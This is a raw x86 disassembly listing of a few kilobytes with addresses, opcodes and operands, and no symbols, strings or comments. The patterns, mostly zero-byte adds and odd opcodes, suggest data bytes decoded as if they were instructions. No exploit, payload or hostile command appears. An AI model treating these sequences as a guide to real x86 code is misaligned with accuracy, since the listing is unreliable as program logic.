  4053e1:	cli    
  4053e2:	and    eax,0x160033
  4053e7:	add    BYTE PTR [ecx],al
  4053e9:	add    BYTE PTR [eax],al
  4053eb:	add    BYTE PTR [edx+0x7000000],al
  4053f1:	add    BYTE PTR [eax],al
  4053f3:	add    BYTE PTR [ecx],ah
  4053f5:	add    BYTE PTR [eax],al
  4053f7:	add    BYTE PTR [ebx+0x0],dh
  4053fa:	add    BYTE PTR [eax],al
  4053fc:	push   eax
  4053fd:	add    BYTE PTR [eax],al
  4053ff:	add    BYTE PTR [edx],cl
  405401:	add    BYTE PTR [eax],al
  405403:	add    ah,al
  405405:	add    BYTE PTR [eax],al
  405407:	add    BYTE PTR [eax+eax*1],al
  40540a:	add    BYTE PTR [eax],al
  40540c:	daa    
  40540d:	add    BYTE PTR [eax],al
  40540f:	add    BYTE PTR [ecx],al
  405411:	add    BYTE PTR [eax],al
  405413:	add    BYTE PTR [esi],bl
  405415:	add    BYTE PTR [eax],al
  405417:	add    BYTE PTR [eax+eax*1],al
  40541a:	add    BYTE PTR [eax],al
  40541c:	xor    al,0x0
  40541e:	add    BYTE PTR [eax],al
  405420:	cmp    eax,DWORD PTR [eax]
  405422:	add    BYTE PTR [eax],al
  405424:	push   cs
  405425:	add    BYTE PTR [eax],al
  405427:	add    BYTE PTR [esi],cl
  405429:	add    BYTE PTR [eax],al
  40542b:	add    BYTE PTR [ecx],al
  40542d:	add    BYTE PTR [eax],al
  40542f:	add    BYTE PTR [eax+eax*1],al
  405432:	add    BYTE PTR [eax],al
  405434:	add    DWORD PTR [eax],eax
  405436:	add    BYTE PTR [eax],al
  405438:	add    al,BYTE PTR [eax]
  40543a:	add    BYTE PTR [eax],al
  40543c:	add    al,BYTE PTR [eax]
  40543e:	add    BYTE PTR [eax],al
  405440:	add    BYTE PTR [eax],al
  405442:	or     al,BYTE PTR [eax]
  405444:	add    DWORD PTR [eax],eax
  405446:	add    BYTE PTR [eax],al
  405448:	add    BYTE PTR [eax],al
  40544a:	push   es
  40544b:	add    BYTE PTR [edi+0x0],dh
  40544e:	jo     0x405450
  405450:	push   es
  405451:	add    BYTE PTR [eax+0x6007e00],dl
  405457:	add    dl,dh
  405459:	add    al,ch
  40545b:	add    BYTE PTR [esi],al
  40545d:	add    BYTE PTR [esi],bh
  40545f:	add    DWORD PTR [ebx],esp
  405461:	add    DWORD PTR [esi],eax
  405463:	add    BYTE PTR [ebp+0x1],al
  405466:	jle    0x405468
  405468:	push   es
  405469:	add    BYTE PTR [eax+0x1],dl
  40546c:	jo     0x40546e
  40546e:	push   es
  40546f:	add    BYTE PTR [ecx+eax*1+0x7e],ah
  405473:	add    BYTE PTR [edx],cl
  405475:	add    BYTE PTR [esi+0xa018701],dl
  40547b:	add    BYTE PTR [eax+0xa018701],bh
  405481:	add    ah,ch
  405483:	add    DWORD PTR [edi+0x41000a01],eax
  405489:	add    al,BYTE PTR [edi+0x51000a01]
  40548f:	add    al,BYTE PTR [edi-0x62fff5ff]
  405495:	add    al,BYTE PTR [edi-0x54fff9ff]
  40549b:	add    bh,BYTE PTR [esi+0x0]
  40549e:	or     al,BYTE PTR [eax]
  4054a0:	jmp    0x4054a4
  4054a2:	xchg   DWORD PTR [ecx],eax
  4054a4:	or     al,BYTE PTR [eax]
  4054a6:	adc    al,0x3
  4054a8:	xchg   DWORD PTR [ecx],eax
  4054aa:	push   es
  4054ab:	add    BYTE PTR [edi+0x3],bl
  4054ae:	jle    0x4054b0
  4054b0:	push   es
  4054b1:	add    BYTE PTR ds:0x6012304,ah
  4054b7:	add    BYTE PTR [ebx],dh
  4054b9:	add    al,0x7e
  4054bb:	add    BYTE PTR [esi],al
  4054bd:	add    BYTE PTR [ebp+0x4],bl
  4054c0:	jle    0x4054c2
  4054c2:	or     al,BYTE PTR [eax]
  4054c4:	scas   eax,DWORD PTR es:[edi]
  4054c5:	add    al,0x87
  4054c7:	add    DWORD PTR [esi],eax
  4054c9:	add    BYTE PTR [ebx+0x6],ch
  4054cc:	pop    edx
  4054cd:	push   es
  4054ce:	push   es
  4054cf:	add    BYTE PTR [esi+eax*1+0x60687],bl
  4054d6:	pop    esp
  4054d7:	or     eax,0x60070
  4054dc:	mov    esp,0x60d9d0d
  4054e1:	add    al,dl
  4054e3:	or     eax,0x60070
  4054e8:	out    0xd,al
  4054ea:	jle    0x4054ec
  4054ec:	push   es
  4054ed:	add    ch,bh
  4054ef:	or     eax,0x6007e
  4054f4:	sbb    cl,BYTE PTR [esi]
  4054f6:	jle    0x4054f8
  4054f8:	push   es
  4054f9:	add    BYTE PTR [eax],bh
  4054fb:	push   cs
  4054fc:	jle    0x4054fe
  4054fe:	push   es
  4054ff:	add    BYTE PTR [ecx+0xe],dl
  405502:	jle    0x405504
  405504:	push   es
  405505:	add    BYTE PTR [edx+0xe],ch
  405508:	jle    0x40550a
  40550a:	push   es
  40550b:	add    BYTE PTR [ebp+0x6007e0e],al
  405511:	add    BYTE PTR [esi+0x6007e0e],bl
  405517:	add    BYTE PTR [ebx+0x6007e0e],bh
  40551d:	add    cl,ah
  40551f:	push   cs
  405520:	pop    edx
  405521:	push   es
  405522:	push   es
  405523:	add    BYTE PTR [ebx],al
  405525:	cvtps2pd xmm0,QWORD PTR [esi]
  405528:	push   es
  405529:	add    BYTE PTR ds:0x6007e0f,ah
  40552f:	add    BYTE PTR [eax+0xf],al
  405532:	jle    0x405534
  405534:	push   es
  405535:	add    BYTE PTR [ecx+0xf],bl
  405538:	jle    0x40553a
  40553a:	push   es
  40553b:	add    BYTE PTR [edi+0x60f770f],dl
  405541:	add    cl,dl
  405543:	lgs    ecx,FWORD PTR [edi]
  405546:	push   es
  405547:	add    bl,ch
  405549:	lgs    ecx,FWORD PTR [edi]
  40554c:	push   es
  40554d:	add    BYTE PTR ds:0xb30ffa10,cl
  405553:	add    BYTE PTR [ecx],ah
  405555:	adc    BYTE PTR [eax],al
  405557:	add    BYTE PTR [esi],al
  405559:	add    BYTE PTR [eax],dh
  40555b:	adc    BYTE PTR [edi+0xf],dh
  40555e:	or     al,BYTE PTR [eax]
  405560:	popa   
  405561:	adc    BYTE PTR [edi-0x73ffecff],al
  405567:	adc    BYTE PTR [eax],al
  405569:	add    BYTE PTR [esi],al
  40556b:	add    bl,al
  40556d:	adc    BYTE PTR [eax+0x0],dh
  405570:	push   es
  405571:	add    cl,ah
  405573:	adc    BYTE PTR [esi+0x0],bh
  405576:	push   es
  405577:	add    bh,dh
  405579:	adc    BYTE PTR [eax+0x0],dh
  40557c:	push   es
  40557d:	add    BYTE PTR [ebx],al
  40557f:	adc    DWORD PTR [eax+0x0],esi
  405582:	push   es
  405583:	add    BYTE PTR [eax],ch
  405585:	adc    DWORD PTR [esi+0x0],edi
  405588:	push   es
  405589:	add    BYTE PTR [esi+0x11],ah
  40558c:	jo     0x40558e
  40558e:	push   es
  40558f:	add    BYTE PTR [ebp+0x11],ch
  405592:	jo     0x405594
  405594:	push   es
  405595:	add    BYTE PTR [ecx+edx*1+0xa0070],al
  40559c:	xchg   esi,eax
  40559d:	adc    DWORD PTR [edi-0x3ffff9ff],eax
  4055a3:	adc    DWORD PTR [eax+0x0],esi
  4055a6:	push   es
  4055a7:	add    dh,al
  4055a9:	adc    DWORD PTR [eax+0x0],esi
  4055ac:	or     al,BYTE PTR [eax]
  4055ae:	clc    
  4055af:	adc    DWORD PTR [edi+0x22000a01],eax
  4055b5:	adc    cl,BYTE PTR [edx+edx*1]
  4055b8:	push   cs
  4055b9:	add    BYTE PTR [esi+0x12],ah
  4055bc:	dec    ebx
  4055bd:	adc    dl,BYTE PTR [edx]
  4055bf:	add    BYTE PTR [eax+0x12128112],ah
  4055c5:	add    cl,bl
  4055c7:	adc    dh,BYTE PTR [ebx+0x15001212]
  4055cd:	adc    ebp,ebp
  4055cf:	adc    cl,BYTE PTR [edx]
  4055d1:	add    BYTE PTR [edi],ch
  4055d3:	adc    eax,DWORD PTR [edi+0x3e000a01]
  4055d9:	adc    eax,DWORD PTR [edi+0x5e000a01]
  4055df:	adc    eax,DWORD PTR [edi-0x73fff9ff]
  4055e5:	adc    edi,DWORD PTR [esi+0x0]
  4055e8:	or     al,BYTE PTR [eax]
  4055ea:	mov    esp,0xa018713
  4055ef:	add    BYTE PTR [ecx],ah
  4055f1:	adc    al,0x87
  4055f3:	add    DWORD PTR [edx],ecx
  4055f5:	add    BYTE PTR [eax+0x14],cl
  4055f8:	xchg   DWORD PTR [ecx],eax
  4055fa:	or     al,BYTE PTR [eax]
  4055fc:	fs adc al,0x87
  4055ff:	add    DWORD PTR [edx],ecx
  405601:	add    BYTE PTR [esp+edx*1+0xa0187],al
  405608:	pushf  
  405609:	adc    al,0x87
  40560b:	add    DWORD PTR [edx],ecx
  40560d:	add    BYTE PTR [edx+0xa018714],dh
  405613:	add    ch,al
  405615:	adc    al,0x87
  405617:	add    DWORD PTR [edx],ecx
  405619:	add    cl,bl
  40561b:	adc    al,0x87
  40561d:	add    DWORD PTR [esi],eax
  40561f:	add    BYTE PTR ds:0xa007015,dl
  405625:	add    BYTE PTR [eax],ch
  405627:	adc    eax,0x60187
  40562c:	fs adc eax,0xa0070
  405632:	outs   dx,BYTE PTR ds:[esi]
  405633:	adc    eax,0xa0187
  405638:	xchg   ecx,eax
  405639:	adc    eax,0xa0187
  40563e:	lods   eax,DWORD PTR ds:[esi]
  40563f:	adc    eax,0xa0187
  405644:	enter  0x8715,0x1
  405648:	or     al,BYTE PTR [eax]
  40564a:	add    BYTE PTR [esi],dl
  40564c:	or     al,0x12
  40564e:	or     al,BYTE PTR [eax]
  405650:	adc    edx,DWORD PTR [esi]
  405652:	xchg   DWORD PTR [ecx],eax
  405654:	push   es
  405655:	add    BYTE PTR [ecx],ch
  405657:	push   ss
  405658:	jo     0x40565a
  40565a:	or     al,BYTE PTR [eax]
  40565c:	xor    DWORD PTR [esi],edx
  40565e:	xchg   DWORD PTR [ecx],eax
  405660:	or     al,BYTE PTR [eax]
  405662:	dec    edx
  405663:	push   ss
  405664:	or     al,0x12
  405666:	or     al,BYTE PTR [eax]
  405668:	push   0x16
  40566a:	xchg   DWORD PTR [ecx],eax
  40566c:	or     al,BYTE PTR [eax]
  40566e:	cwde   
  40566f:	push   ss
  405670:	xchg   DWORD PTR [ecx],eax
  405672:	push   es
  405673:	add    ah,al
  405675:	push   ss
  405676:	jo     0x405678
  405678:	or     al,BYTE PTR [eax]
  40567a:	ficom  WORD PTR [esi]
  40567c:	xchg   DWORD PTR [ecx],eax
  40567e:	or     al,BYTE PTR [eax]
  405680:	stc    
  405681:	push   ss
  405682:	xchg   DWORD PTR [ecx],eax
  405684:	or     al,BYTE PTR [eax]
  405686:	daa    
  405687:	pop    ss
  405688:	xchg   DWORD PTR [ecx],eax
  40568a:	or     al,BYTE PTR [eax]
  40568c:	cmp    al,0x17
  40568e:	xchg   DWORD PTR [ecx],eax
  405690:	adc    al,BYTE PTR [eax]
  405692:	push   0x17
  405694:	in     eax,dx
  405695:	adc    cl,BYTE PTR [edx]
  405697:	add    BYTE PTR [ebx+0x17],bh
  40569a:	xchg   DWORD PTR [ecx],eax
  40569c:	or     al,BYTE PTR [eax]
  40569e:	cwde   
  40569f:	pop    ss
  4056a0:	xchg   DWORD PTR [ecx],eax
  4056a2:	push   es
  4056a3:	add    BYTE PTR [edx],cl
  4056a5:	sbb    BYTE PTR [eax+0x0],dh
  4056a8:	push   cs
  4056a9:	add    BYTE PTR ds:0xe124b18,ch
  4056af:	add    BYTE PTR [eax+ebx*1+0x4b],dl
  4056b3:	adc    al,BYTE PTR [esi]
  4056b5:	add    BYTE PTR [eax+0x18],dh
  4056b8:	and    eax,DWORD PTR [ecx]
  4056ba:	push   es
  4056bb:	add    BYTE PTR [edx+0xa188f18],ah
  4056c1:	add    BYTE PTR [eax+ebx*1+0xa0187],bh
  4056c8:	fcomp  QWORD PTR [eax]
  4056ca:	xchg   DWORD PTR [ecx],eax
  4056cc:	push   es
  4056cd:	add    BYTE PTR [edi],ah
  4056cf:	sbb    DWORD PTR [edi+0x64000618],ecx
  4056d5:	sbb    edi,edx
  4056d7:	clts   
  4056d9:	add    BYTE PTR [ebx+ebx*1+0x70],bh
  4056dd:	add    BYTE PTR [esi],al
  4056df:	add    BYTE PTR [ecx+0xa00701b],dh
  4056e5:	add    BYTE PTR [esi],cl
  4056e7:	sbb    eax,0x6120c
  4056ec:	xor    al,0x1d
  4056ee:	call   0x5d4060f3
  4056f3:	sbb    eax,0x61d45
  4056f8:	jl     0x405717
  4056fa:	call   0x9b405cff
  4056ff:	sbb    eax,0xa00e8
  405704:	test   al,0x1d
  405706:	inc    ebp
  405707:	sbb    eax,0x1dd90006
  40570c:	ja     0x40571d
  40570e:	or     al,BYTE PTR [eax]
  405710:	sub    BYTE PTR [esi],bl
  405712:	inc    ebp
  405713:	sbb    eax,0x1e3f0006
  405718:	cli    
  405719:	clts   
  40571b:	add    BYTE PTR [esi+ebx*1+0x7e],ch
  40571f:	add    BYTE PTR [edx],cl
  405721:	add    BYTE PTR [esi+ebx*1+0xa120c],cl
  405728:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405729:	push   ds
  40572a:	or     al,0x12
  40572c:	push   cs
  40572d:	add    dl,ah
  40572f:	push   ds
  405730:	dec    ebx
  405731:	adc    al,BYTE PTR [esi]
  405733:	add    BYTE PTR [edi+ebx*1],dl
  405736:	jo     0x405738
  405738:	push   es
  405739:	add    BYTE PTR [edi+ebx*1],ah
  40573c:	jo     0x40573e
  40573e:	push   es
  40573f:	add    BYTE PTR [esi],ch
  405741:	pop    ds
  405742:	jle    0x405744
  405744:	push   es
  405745:	add    BYTE PTR [ebx+0x1f],al
  405748:	jo     0x40574a
  40574a:	push   es
  40574b:	add    BYTE PTR [edi+ebx*1+0x60],ch
  40574f:	pop    ds
  405750:	push   es
  405751:	add    dh,cl
  405753:	pop    ds
  405754:	call   0x405759
  405759:	add    BYTE PTR [ecx],al
  40575b:	add    BYTE PTR [eax],al
  40575d:	add    BYTE PTR [eax],al
  40575f:	add    BYTE PTR [ecx],al
  405761:	add    BYTE PTR [ecx],al
  405763:	add    BYTE PTR [eax],al
  405765:	add    BYTE PTR [eax],dl
  405767:	add    BYTE PTR [edx],dl
  405769:	add    BYTE PTR [eax+eax*1],ah
  40576c:	add    eax,0x1000100
  405771:	add    BYTE PTR [eax],al
  405773:	add    BYTE PTR [eax],dl
  405775:	add    BYTE PTR ds:0x5002400,bh
  40577b:	add    BYTE PTR [esi],al
  40577d:	add    BYTE PTR ds:0x10000000,ah
  405783:	add    BYTE PTR [esi+0x0],dl
  405786:	and    al,0x0
  405788:	add    eax,0x34000e00
  40578d:	add    BYTE PTR [eax+0x63001001],al
  405793:	add    BYTE PTR [eax+eax*1],ah
  405796:	add    eax,0x5f001000
  40579b:	add    BYTE PTR [ebx],al
  40579d:	add    DWORD PTR [eax],edx
  40579f:	add    BYTE PTR [ecx+ebx*1],al
  4057a2:	add    BYTE PTR [eax],al
  4057a4:	add    eax,0x62001000
  4057a9:	add    BYTE PTR [ebx],al
  4057ab:	add    DWORD PTR [eax],edx
  4057ad:	add    bh,al
  4057af:	sbb    eax,DWORD PTR [eax]
  4057b1:	add    BYTE PTR ds:0x6b001900,al
  4057b7:	add    BYTE PTR [ecx-0x80],dl
  4057ba:	popf   
  4057bb:	add    BYTE PTR [edx],cl
  4057bd:	add    BYTE PTR [ecx-0x80],dl
  4057c0:	mov    dl,0x0
  4057c2:	or     al,BYTE PTR [eax]
  4057c4:	push   ecx
  4057c5:	add    bl,0x0
  4057c8:	or     al,BYTE PTR [eax]
  4057ca:	push   ecx
  4057cb:	adc    bh,0x0
  4057ce:	or     al,BYTE PTR [eax]
  4057d0:	add    DWORD PTR [eax],eax
  4057d2:	std    
  4057d3:	add    BYTE PTR ds:0xc9000100,bl
  4057d9:	add    al,0x19
  4057db:	add    DWORD PTR [ecx],eax
  4057dd:	add    bh,cl
  4057df:	add    al,0x1d
  4057e1:	add    DWORD PTR [ecx],eax
  4057e3:	add    cl,bl
  4057e5:	add    al,0x24
  4057e7:	add    DWORD PTR [ecx],eax
  4057e9:	add    bl,ah
  4057eb:	add    al,0x24
  4057ed:	add    DWORD PTR [ecx],eax
  4057ef:	add    ah,ch
  4057f1:	add    al,0x27
  4057f3:	add    DWORD PTR [ecx],eax
  4057f5:	add    cl,bh
  4057f7:	add    al,0x27
  4057f9:	add    DWORD PTR [ecx],eax
  4057fb:	add    BYTE PTR [edi],al
  4057fd:	add    eax,0x10124
  405802:	std    
  405803:	add    BYTE PTR ds:0x7b001100,bl
  405809:	push   es
  40580a:	add    DWORD PTR fs:[ecx],edx
  40580d:	add    BYTE PTR [eax+0x1016806],ch
  405813:	add    BYTE PTR [ebp+0x1058519],dh
  405819:	add    BYTE PTR [ebx+0x1a],bl
  40581c:	mov    es,WORD PTR ds:0x1a660001
  405822:	mov    es,WORD PTR ds:0xd370006
  405828:	sbb    DWORD PTR [ecx],eax
  40582a:	push   es
  40582b:	add    BYTE PTR [esi+0x601191a],ah
  405831:	add    BYTE PTR [edx+ebx*1+0x60585],dh
  405838:	rcr    BYTE PTR [edx],0x95
  40583b:	add    eax,0x1ad80006
  405840:	cdq    
  405841:	add    eax,0x1ae30006
  405846:	mov    es,WORD PTR ds:0x19b50001
  40584c:	retf   
  40584d:	add    eax,0x1a5b0001
  405852:	mov    es,WORD PTR ds:0x1a660001
  405858:	mov    es,WORD PTR ds:0xd370006
  40585e:	sbb    DWORD PTR [ecx],eax
  405860:	push   es
  405861:	add    BYTE PTR [esi+0x601191a],ah
  405867:	add    BYTE PTR [eax+0x605cb1c],cl
  40586d:	add    al,al
  40586f:	sbb    dl,BYTE PTR [ebp-0x5dfff9fb]
  405875:	sbb    al,0xd4
  405877:	add    eax,0x1cad0006
  40587c:	mov    es,WORD PTR ds:0x2150
  405882:	add    BYTE PTR [eax],al
  405884:	xchg   BYTE PTR [eax],bl
  405886:	or     al,BYTE PTR [ecx]
  405888:	and    DWORD PTR [eax],eax
  40588a:	add    DWORD PTR [eax],eax
  40588c:	pop    eax
  40588d:	and    DWORD PTR [eax],eax
  40588f:	add    BYTE PTR [eax],al
  405891:	add    BYTE PTR [esi+0x25011000],al
  405897:	add    BYTE PTR [ecx],al
  405899:	add    BYTE PTR [eax],dh
  40589b:	and    eax,DWORD PTR [eax]
  40589d:	add    BYTE PTR [eax],al
  40589f:	add    BYTE PTR [ecx+0x2b015500],al
  4058a5:	add    BYTE PTR [edx],al
  4058a7:	add    al,bh
  4058a9:	and    eax,DWORD PTR [eax]
  4058ab:	add    BYTE PTR [eax],al
  4058ad:	add    BYTE PTR [ecx+0x3b016f00],al
  4058b3:	add    BYTE PTR [eax+eax*1],al
  4058b6:	pusha  
  4058b7:	and    al,0x0
  4058b9:	add    BYTE PTR [eax],al
  4058bb:	add    BYTE PTR [ecx+0x4201a400],al
  4058c1:	add    BYTE PTR ds:0x252800,al
  4058c7:	add    BYTE PTR [eax],al
  4058c9:	add    BYTE PTR [ecx+0x4801cc00],al
  4058cf:	add    BYTE PTR [esi],al
  4058d1:	add    BYTE PTR [eax+0x25],ch
  4058d4:	add    BYTE PTR [eax],al
  4058d6:	add    BYTE PTR [eax],al
  4058d8:	add    DWORD PTR [eax],0x5001db
  4058de:	or     BYTE PTR [eax],al
  4058e0:	and    al,0x27
  4058e2:	add    BYTE PTR [eax],al
  4058e4:	add    BYTE PTR [eax],al
  4058e6:	add    DWORD PTR [eax],0x5801fd
  4058ec:	or     al,BYTE PTR [eax]
  4058ee:	adc    al,0x28
  4058f0:	add    BYTE PTR [eax],al
  4058f2:	add    BYTE PTR [eax],al
  4058f4:	add    DWORD PTR [eax],0x620210
  4058fa:	or     eax,0x286000
  4058ff:	add    BYTE PTR [eax],al
  405901:	add    BYTE PTR [ecx+0x62022500],al
  405907:	add    BYTE PTR ds:0x28ac00,cl
  40590d:	add    BYTE PTR [eax],al
  40590f:	add    BYTE PTR [ecx+0x67026000],al
  405915:	add    BYTE PTR ds:0x2a1100,cl
  40591b:	add    BYTE PTR [eax],al
  40591d:	add    BYTE PTR [ecx+0x75027100],al
  405923:	add    BYTE PTR [ebx],dl
  405925:	add    BYTE PTR [edx+ebp*1+0x0],cl
  405929:	add    BYTE PTR [eax],al
  40592b:	add    BYTE PTR [ecx+0x75028700],al
  405931:	add    BYTE PTR [esi],dl
  405933:	add    BYTE PTR [eax+0x2a],ah
  405939:	add    BYTE PTR [ecx+0x7f02b900],al
  40593f:	add    BYTE PTR [ecx],bl
  405941:	add    ah,cl
  405943:	sub    al,BYTE PTR [eax]
  405945:	add    BYTE PTR [eax],al
  405947:	add    BYTE PTR [ecx-0x78fd2800],al
  40594d:	add    BYTE PTR [ebx],bl
  40594f:	add    BYTE PTR [eax],dl
  405951:	sub    eax,DWORD PTR [eax]
  405953:	add    BYTE PTR [eax],al
  405955:	add    BYTE PTR [ecx-0x73fd0500],al
  40595b:	add    BYTE PTR [eax+eax*1],bl
  40595e:	mov    al,ds:0x2b
  405963:	add    BYTE PTR [ecx-0x6afcd900],al
  405969:	add    BYTE PTR [edi],bl
  40596b:	add    BYTE PTR [eax+0x2c],ch
  405971:	add    BYTE PTR [ecx-0x78fcca00],al
  405977:	add    BYTE PTR [edx],ah
  405979:	add    al,dl
  40597b:	sub    al,0x0
  40597d:	add    BYTE PTR [eax],al
  40597f:	add    BYTE PTR [ecx-0x61fcb300],al
  405985:	add    BYTE PTR [ebx],ah
  405987:	add    BYTE PTR [eax],al
  405989:	sub    eax,0x0
  40598e:	add    DWORD PTR [eax],0xa40369
  405994:	and    al,0x0
  405996:	pushf  
  405997:	sub    eax,0x0
  40599c:	add    DWORD PTR [eax],0xb40374
  4059a2:	add    BYTE PTR es:[esi+ebp*1],al
  4059a6:	add    BYTE PTR [eax],al
  4059a8:	add    BYTE PTR [eax],al
  4059aa:	add    DWORD PTR [eax],0xbb038b
  4059b0:	daa    
  4059b1:	add    BYTE PTR [eax],ch
  4059b3:	add    BYTE PTR cs:[eax],al
  4059b6:	add    BYTE PTR [eax],al
  4059b8:	add    DWORD PTR [eax],0xc203a3
  4059be:	sub    BYTE PTR [eax],al
  4059c0:	cmp    al,0x2f
  4059c2:	add    BYTE PTR [eax],al
  4059c4:	add    BYTE PTR [eax],al
  4059c6:	add    DWORD PTR [eax],0xc801db
  4059cc:	sub    DWORD PTR [eax],eax
  4059ce:	and    al,0x32
  4059d0:	add    BYTE PTR [eax],al
  4059d2:	add    BYTE PTR [eax],al
  4059d4:	add    DWORD PTR [eax],0x6203ae
  4059da:	sub    eax,0x327000
  4059df:	add    BYTE PTR [eax],al
  4059e1:	add    BYTE PTR [ecx-0x2dfc3e00],al
  4059e7:	add    BYTE PTR ds:0x32a000,ch
  4059ed:	add    BYTE PTR [eax],al
  4059ef:	add    BYTE PTR [ecx-0x28fc2200],al
  4059f5:	add    BYTE PTR ds:0x32d400,ch
  4059fb:	add    BYTE PTR [eax],al
  4059fd:	add    BYTE PTR [ecx-0x21fc0b00],al
  405a03:	add    BYTE PTR [esi],ch
  405a05:	add    BYTE PTR [ebx+esi*1],cl
  405a08:	add    BYTE PTR [eax],al
  405a0a:	add    BYTE PTR [eax],al
  405a0c:	add    DWORD PTR [eax],0xe70413
  405a12:	xor    DWORD PTR [eax],eax
  405a14:	hlt    
  405a15:	xor    al,0x0
  405a17:	add    BYTE PTR [eax],al
  405a19:	add    BYTE PTR [ecx-0x12fbc000],al
  405a1f:	add    BYTE PTR [edx],dh
  405a21:	add    al,al
  405a23:	add    BYTE PTR ss:[eax],al
  405a26:	add    BYTE PTR [eax],al
  405a28:	add    DWORD PTR [eax],0xf80467
  405a2e:	xor    eax,DWORD PTR [eax]
  405a30:	in     al,0x36
  405a32:	add    BYTE PTR [eax],al
  405a34:	add    BYTE PTR [eax],al
  405a36:	add    DWORD PTR [eax],0x1030480
  405a3c:	xor    al,0x0
  405a3e:	cmp    al,0x37
  405a40:	add    BYTE PTR [eax],al
  405a42:	add    BYTE PTR [eax],al
  405a44:	add    DWORD PTR [eax],0x9e0496
  405a4a:	xor    eax,0x376900
  405a4f:	add    BYTE PTR [eax],al
  405a51:	add    BYTE PTR [ecx+0x904a400],al
  405a57:	add    DWORD PTR [esi],esi
  405a59:	add    BYTE PTR [eax+0x37],al
  405a5f:	add    BYTE PTR [ecx+0x904a900],al
  405a65:	add    DWORD PTR [eax],edi
  405a67:	add    BYTE PTR [edi+esi*1+0x0],ah
  405a6e:	add    DWORD PTR [eax],0x11004bf
  405a74:	cmp    al,BYTE PTR [eax]
  405a76:	cmp    BYTE PTR fs:[eax],al
  405a79:	add    BYTE PTR [eax],al
  405a7b:	add    BYTE PTR [ecx+0x21010a18],al
  405a81:	add    BYTE PTR [esi],bh
  405a83:	add    BYTE PTR [eax+edi*1+0x0],dh
  405a8a:	xchg   BYTE PTR [eax],bl
  405a8c:	or     al,BYTE PTR [ecx]
  405a8e:	sub    al,BYTE PTR [ecx]
  405a90:	ds add bh,cl
  405a93:	cmp    BYTE PTR [eax],al
  405a95:	add    BYTE PTR [eax],al
  405a97:	add    BYTE PTR [esi+0x30051008],al
  405a9d:	add    DWORD PTR [edi],edi
  405a9f:	add    bh,dl
  405aa1:	cmp    BYTE PTR [eax],al
  405aa3:	add    BYTE PTR [eax],al
  405aa5:	add    BYTE PTR [esi+0x35051e08],al
  405aab:	add    DWORD PTR [edi],edi
  405aad:	add    bh,bl
  405aaf:	cmp    BYTE PTR [eax],al
  405ab1:	add    BYTE PTR [eax],al
  405ab3:	add    BYTE PTR [esi+0x39052b08],al
  405ab9:	add    DWORD PTR [edi],edi
  405abb:	add    BYTE PTR [eax],al
  405abd:	cmp    DWORD PTR [eax],eax
  405abf:	add    BYTE PTR [eax],al
  405ac1:	add    BYTE PTR [esi+0x35053808],al
  405ac7:	add    DWORD PTR [eax+0x0],eax
  405aca:	or     BYTE PTR [ecx],bh
  405acc:	add    BYTE PTR [eax],al
  405ace:	add    BYTE PTR [eax],al
  405ad0:	xchg   BYTE PTR [eax],cl
  405ad2:	dec    esp
  405ad3:	add    eax,0x400139
  405ad8:	pop    esi
  405ad9:	cmp    DWORD PTR [eax],eax
  405adb:	add    BYTE PTR [eax],al
  405add:	add    BYTE PTR [esi+0x35056008],al
  405ae3:	add    DWORD PTR [ecx+0x0],eax
  405ae6:	cmp    WORD PTR [eax],ax
  405ae9:	add    BYTE PTR [eax],al
  405aeb:	add    BYTE PTR [esi+0x39057408],al
  405af1:	add    DWORD PTR [ecx+0x0],eax
  405af4:	xchg   edi,eax
  405af5:	cmp    DWORD PTR [eax],eax
  405af7:	add    BYTE PTR [eax],al
  405af9:	add    BYTE PTR [esi+0x3e058808],al
  405aff:	add    DWORD PTR [edx+0x0],eax
  405b02:	lahf   
  405b03:	cmp    DWORD PTR [eax],eax
  405b05:	add    BYTE PTR [eax],al
  405b07:	add    BYTE PTR [esi+0x42059e08],al
  405b0d:	add    DWORD PTR [edx+0x0],eax
  405b10:	test   al,0x39
  405b12:	add    BYTE PTR [eax],al
  405b14:	add    BYTE PTR [eax],al
  405b16:	xchg   BYTE PTR [eax],cl
  405b18:	mov    ah,0x5
  405b1a:	add    DWORD PTR ds:[ebx+0x0],eax
  405b1e:	mov    al,0x39
  405b20:	add    BYTE PTR [eax],al
  405b22:	add    BYTE PTR [eax],al
  405b24:	xchg   BYTE PTR [eax],cl
  405b26:	mov    BYTE PTR ds:0x430142,0xb9
  405b2d:	cmp    DWORD PTR [eax],eax
  405b2f:	add    BYTE PTR [eax],al
  405b31:	add    BYTE PTR [esi+0x4705d808],al
  405b37:	add    DWORD PTR [eax+eax*1-0x3f],eax
  405b3b:	cmp    DWORD PTR [eax],eax
  405b3d:	add    BYTE PTR [eax],al
  405b3f:	add    BYTE PTR [esi+0x4c05e908],al
  405b45:	add    DWORD PTR [eax+eax*1-0x36],eax
  405b49:	cmp    DWORD PTR [eax],eax
  405b4b:	add    BYTE PTR [eax],al
  405b4d:	add    BYTE PTR [ebx+0x21010a18],al
  405b53:	add    BYTE PTR [ebp+0x0],al
  405b56:	aam    0x39
  405b58:	add    BYTE PTR [eax],al
  405b5a:	add    BYTE PTR [eax],al
  405b5c:	xchg   ebx,eax
  405b5d:	or     BYTE PTR [eax+0x45016c06],bh
  405b63:	add    BYTE PTR [ebx],dl
  405b65:	cmp    al,BYTE PTR [eax]
  405b67:	add    BYTE PTR [eax],al
  405b69:	add    BYTE PTR [ebx+0x7106cc08],dl
  405b6f:	add    DWORD PTR [ebp+0x0],eax
  405b72:	sbb    bh,BYTE PTR [edx]
  405b74:	add    BYTE PTR [eax],al
  405b76:	add    BYTE PTR [eax],al
  405b78:	xchg   ebx,eax
  405b79:	or     al,bl
  405b7b:	push   es
  405b7c:	jbe    0x405b7f
  405b7e:	inc    ebp
  405b7f:	add    BYTE PTR [edx],ah
  405b81:	cmp    al,BYTE PTR [eax]
  405b83:	add    BYTE PTR [eax],al
  405b85:	add    BYTE PTR [ebx+0x7c06e408],dl
  405b8b:	add    DWORD PTR [esi+0x0],eax
  405b8e:	cmp    BYTE PTR [edx],bh
  405b90:	add    BYTE PTR [eax],al
  405b92:	add    BYTE PTR [eax],al
  405b94:	xchg   ebx,eax
  405b95:	or     dl,bh
  405b97:	push   es
  405b98:	jl     0x405b9b
  405b9a:	inc    esi
  405b9b:	add    BYTE PTR [esi+0x3a],cl
  405b9e:	add    BYTE PTR [eax],al
  405ba0:	add    BYTE PTR [eax],al
  405ba2:	xchg   ebx,eax
  405ba3:	or     BYTE PTR [esi],cl
  405ba5:	pop    es
  405ba6:	jl     0x405ba9
  405ba8:	inc    esi
